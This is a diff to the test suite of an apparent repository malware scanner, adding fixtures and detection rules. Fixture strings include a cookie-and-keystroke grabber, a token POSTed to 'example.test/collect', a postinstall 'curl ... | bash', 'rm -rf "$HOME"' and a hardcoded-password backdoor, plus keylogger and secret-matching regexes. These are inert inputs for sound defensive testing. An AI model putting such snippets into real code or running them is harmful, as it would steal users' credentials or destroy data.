@@ -82,6 +82,29 @@ describe("scanGitHubRepo integration", () => {
     expect(result.scanSummary.filesScanned).toBe(1)
   })
 
+  it("keeps benign llmfit UI and installer patterns low risk", async () => {
+    const result = await scan({
+      "llmfit-desktop/ui/app.js": [
+        `document.addEventListener('keydown', (e) => {`,
+        `  if (e.key === 'Escape') closeModal()`,
+        `})`,
+      ].join("\n"),
+      "llmfit-desktop/ui/i18n.js": [
+        `const LOCALE_KEY = 'llmfit.locale'`,
+        `const stored = window.localStorage.getItem(LOCALE_KEY)`,
+      ].join("\n"),
+      "install.sh": [
+        `TMPDIR="$(mktemp -d)"`,
+        `trap 'rm -rf "$TMPDIR"' EXIT`,
+      ].join("\n"),
+    })
+
+    expect(result.findings).toHaveLength(0)
+    expect(result.riskScore).toBe(0)
+    expect(result.riskLevel).toBe("low")
+    expect(result.safeToClone).toBe(true)
+  })
+
   it("pins the whole scan to one commit SHA (TOCTOU)", async () => {
     global.fetch = mockGitHubApi({
       "src/index.js": `export const x = 1\n`
@@ -112,7 +135,7 @@ describe("scanGitHubRepo integration", () => {
 
   it("flags data exfiltration (cookie + keylogger)", async () => {
     const result = await scan({
-      "src/t.js": `export function grab() {\n  const c = document.cookie\n  document.addEventListener("keydown", (e) => console.log(e.key))\n  return c\n}\n`
+      "src/t.js": `export function grab() {\n  const c = document.cookie\n  document.addEventListener("keydown", (e) => sendCapturedKey(e.key))\n  return c\n}\n`
     })
     const exfil = result.findings.find((f) => f.type === "DATA_EXFILTRATION")
     expect(exfil).toBeDefined()
@@ -120,8 +143,35 @@ describe("scanGitHubRepo integration", () => {
     // Evidence pinpoints the matched lines for display and #L deep links.
     expect(exfil!.evidence).toEqual([
       { line: 2, code: "const c = document.cookie" },
-      { line: 3, code: `document.addEventListener("keydown", (e) => console.log(e.key))` }
+      { line: 3, code: `document.addEventListener("keydown", (e) => sendCapturedKey(e.key))` }
     ])
+  })
+
+  it("flags sensitive browser storage sent to a network sink", async () => {
+    const result = await scan({
+      "src/session.js": [
+        `const token = localStorage.getItem("auth_token")`,
+        `fetch("https://example.test/collect", { method: "POST", body: token })`,
+      ].join("\n"),
+    })
+    expect(result.findings).toContainEqual(
+      expect.objectContaining({
+        type: "DATA_EXFILTRATION",
+        severity: "high",
+        description: expect.stringContaining("Sensitive Storage Transmission"),
+      })
+    )
+  })
+
+  it("still flags deletion of a broad user path", async () => {
+    const result = await scan({ "cleanup.sh": `rm -rf "$HOME"\n` })
+    expect(result.findings).toContainEqual(
+      expect.objectContaining({
+        type: "SUSPICIOUS_FILE_ACCESS",
+        confidence: "medium",
+        description: expect.stringContaining("Destructive File Deletion"),
+      })
+    )
   })
 
   it("flags a supply-chain postinstall that fetches over the network", async () => {
@@ -143,11 +193,45 @@ describe("scanGitHubRepo integration", () => {
         scripts: { postinstall: "curl https://example.com/x.sh | bash" }
       }),
       "src/auth.js": `if (password == "admin123") { return true }\n`,
-      "src/t.js": `const c = document.cookie\ndocument.addEventListener("keydown", () => {})\n`
+      "src/t.js": `const c = document.cookie\ndocument.addEventListener("keydown", (e) => sendCapturedKey(e.key))\n`
     })
     expect(result.riskLevel).toBe("high")
     expect(result.safeToClone).toBe(false)
     expect(result.findings.length).toBeGreaterThanOrEqual(3)
+  })
+})
+
+describe("malicious package version bounds", () => {
+  const signatures: SignatureDatabase = {
+    ...EMPTY_SIGNATURES,
+    maliciousPackages: [{
+      name: "event-stream",
+      version: "3.3.6",
+      severity: "high",
+      source: "test",
+    }],
+  }
+
+  async function scanDependency(version: string) {
+    global.fetch = mockGitHubApi({
+      "package.json": JSON.stringify({ dependencies: { "event-stream": version } }),
+    }) as unknown as typeof fetch
+    return scanGitHubRepo(repoInfo, { signatures })
+  }
+
+  it("detects an affected exact version", async () => {
+    const result = await scanDependency("3.3.6")
+    expect(result.findings).toContainEqual(expect.objectContaining({
+      type: "SUSPICIOUS_DEPENDENCY",
+      package: "event-stream",
+    }))
+  })
+
+  it("does not flag an unaffected exact version", async () => {
+    const result = await scanDependency("4.0.1")
+    expect(result.findings.filter((finding) =>
+      finding.type === "SUSPICIOUS_DEPENDENCY"
+    )).toHaveLength(0)
   })
 })
 
@@ -214,7 +298,7 @@ describe("obfuscation signal dedupe + rule thresholds", () => {
       { id: "BACKDOOR_HARDCODED_AUTH", name: "Auth Bypass", pattern: "(?:password|auth)\\s*(?:===?|==)\\s*['\\\"][^'\\\"]{0,20}['\\\"]\\s*\\)", description: "Hardcoded auth", tags: ["backdoor"], severity: "critical" as const }
     ]
     global.fetch = mockGitHubApi({
-      "src/evil.js": `const c = document.cookie\ndocument.addEventListener("keydown", g)\nif (password == "letmein") { return true }\n`
+      "src/evil.js": `const c = document.cookie\ndocument.addEventListener("keydown", (e) => sendCapturedKey(e.key))\nif (password == "letmein") { return true }\n`
     }) as unknown as typeof fetch
     const result = await scanGitHubRepo(repoInfo, {
       signatures: { ...EMPTY_SIGNATURES, yaraRules: rules }
@@ -227,10 +311,10 @@ describe("obfuscation signal dedupe + rule thresholds", () => {
     expect(result.riskLevel).toBe("high") // critical findings still floor to high
   })
 
-  it("medium-fixture shape stays MEDIUM: base64 + storage access + file deletion", async () => {
-    // Mirrors flagrix-io/flagrix-test-medium: with the rule shipped, the
-    // base64 signal counts once → 3 medium findings (0.45) → medium band,
-    // not the 4th duplicate that used to tip it to high (0.60).
+  it("does not inflate benign storage reads and scoped cleanup into medium risk", async () => {
+    // Base64 remains a real heuristic signal, but a generic preference read
+    // and deletion of one application-owned file are no longer called
+    // exfiltration/destructive behavior.
     global.fetch = mockGitHubApi({
       "src/encoder.js": heavyBase64File,
       "src/analytics.js": `const d = localStorage.getItem("k")\nconst v = input.value\n`,
@@ -243,7 +327,7 @@ describe("obfuscation signal dedupe + rule thresholds", () => {
       }
     })
     expect(result.findings.every((f) => f.severity === "medium")).toBe(true)
-    expect(result.riskLevel).toBe("medium")
+    expect(result.riskLevel).toBe("low")
   })
 })
 
@@ -268,7 +352,7 @@ describe("self-scan guardrail (regex literals are inert data)", () => {
 
   it("still flags the same signals as real calls", async () => {
     const result = await scan({
-      "src/payload.js": `document.addEventListener("keydown", (e) => log(e.key))\nconst c = document.cookie\n`
+      "src/payload.js": `document.addEventListener("keydown", (e) => sendCapturedKey(e.key))\nconst c = document.cookie\n`
     })
     expect(result.findings.find((f) => f.type === "DATA_EXFILTRATION")).toBeDefined()
   })
@@ -283,7 +367,7 @@ describe("self-scan guardrail (regex literals are inert data)", () => {
       severity: "critical" as const
     }
     const signatures = { ...EMPTY_SIGNATURES, yaraRules: [KEYLOGGER_RULE] }
-    const fixture = `document.addEventListener("keydown", grab)`
+    const fixture = `document.addEventListener("keydown", (e) => sendCapturedKey(e.key))`
 
     // In a TEST file the attack shape appears in fixture strings — inert
     // inputs that exercise detectors — so it must not fire.
@@ -401,5 +485,110 @@ describe("hardcoded-IP detection (false-positive guardrails)", () => {
       (f) => f.type === "NETWORK_COMMUNICATION"
     )
     expect(netFinding).toBeDefined()
+  })
+
+  it("treats 0.0.0.0 as a wildcard bind address, not outbound C2", async () => {
+    const result = await scan({
+      "run.py": `app.run(host='0.0.0.0', port=5000)\n`
+    })
+    expect(result.findings.find((f) => f.type === "NETWORK_COMMUNICATION")).toBeUndefined()
+  })
+})
+
+describe("deployment configuration without malware inflation", () => {
+  const SECRET_RULE = {
+    id: "HARDCODED_API_KEY",
+    name: "Hardcoded API Key",
+    pattern:
+      "(?:api[_-]?key|apikey|secret[_-]?key|auth[_-]?token|private[_-]?key)\\s*[:=]\\s*['\"]([^'\"]{20,})['\"]",
+    description: "Generic API key / secret key pattern assigned to a variable",
+    tags: ["secrets"],
+    severity: "critical" as const,
+    fileExtensions: [".py"],
+  }
+
+  it("keeps the reproduced SPY dashboard findings low risk and safe to clone", async () => {
+    global.fetch = mockGitHubApi({
+      "app.py": [
+        `app.secret_key = 'your-secret-key-change-in-production'`,
+        `app.run(debug=True, host='0.0.0.0', port=5000, threaded=True)`,
+      ].join("\n"),
+      "run.py": [
+        `app.run(`,
+        `    debug=True,`,
+        `    host='0.0.0.0',`,
+        `    port=5000,`,
+        `)`,
+      ].join("\n"),
+      "requirements.txt": "Flask==3.0.0\npandas==2.1.4\n",
+      "templates/index.html": `<script>fetch('/api/options')</script>`,
+    }) as unknown as typeof fetch
+
+    const result = await scanGitHubRepo(repoInfo, {
+      signatures: { ...EMPTY_SIGNATURES, yaraRules: [SECRET_RULE] },
+    })
+
+    expect(result.scanSummary.scannedFiles).toContain("templates/index.html")
+    expect(result.findings).toHaveLength(3)
+    expect(result.findings.every((finding) =>
+      finding.type === "INSECURE_CONFIGURATION" &&
+      finding.severity === "low" &&
+      finding.cloneBlocking === false
+    )).toBe(true)
+    expect(result.riskLevel).toBe("low")
+    expect(result.safeToClone).toBe(true)
+    expect(result.findings.find((finding) => finding.file === "run.py")?.evidence).toEqual([
+      { line: 2, code: "debug=True," },
+      { line: 3, code: "host='0.0.0.0'," },
+    ])
+  })
+
+  it("downgrades placeholders even when a cached signature set lacks the rule", async () => {
+    const result = await scan({
+      "app.py": `app.secret_key = 'your-secret-key-change-in-production'\n`,
+    })
+    expect(result.findings).toEqual([
+      expect.objectContaining({
+        type: "INSECURE_CONFIGURATION",
+        severity: "low",
+        cloneBlocking: false,
+      }),
+    ])
+    expect(result.safeToClone).toBe(true)
+  })
+
+  it("scans inline JavaScript in HTML with JavaScript-scoped rules", async () => {
+    const keyloggerRule = {
+      id: "EXFIL_KEYLOGGER",
+      name: "Keyboard Capture and Transmission",
+      pattern:
+        "(?:addEventListener\\s*\\(\\s*['\"](?:keydown|keypress|keyup)['\"]|\\.on(?:keydown|keypress|keyup)\\s*=)",
+      description: "Reads and transmits pressed keys",
+      tags: ["keylogger"],
+      severity: "critical" as const,
+      context: "keyboard-capture" as const,
+      fileExtensions: [".js"],
+    }
+    global.fetch = mockGitHubApi({
+      "templates/index.html": [
+        `<button title="keydown is supported">Copy</button>`,
+        `<script>`,
+        `document.addEventListener('keydown', event => {`,
+        `  fetch('/collect', { method: 'POST', body: event.key })`,
+        `})`,
+        `</script>`,
+      ].join("\n"),
+    }) as unknown as typeof fetch
+
+    const result = await scanGitHubRepo(repoInfo, {
+      signatures: { ...EMPTY_SIGNATURES, yaraRules: [keyloggerRule] },
+    })
+    expect(result.findings).toContainEqual(
+      expect.objectContaining({
+        file: "templates/index.html",
+        pattern: "EXFIL_KEYLOGGER",
+        severity: "critical",
+      })
+    )
   })
 })
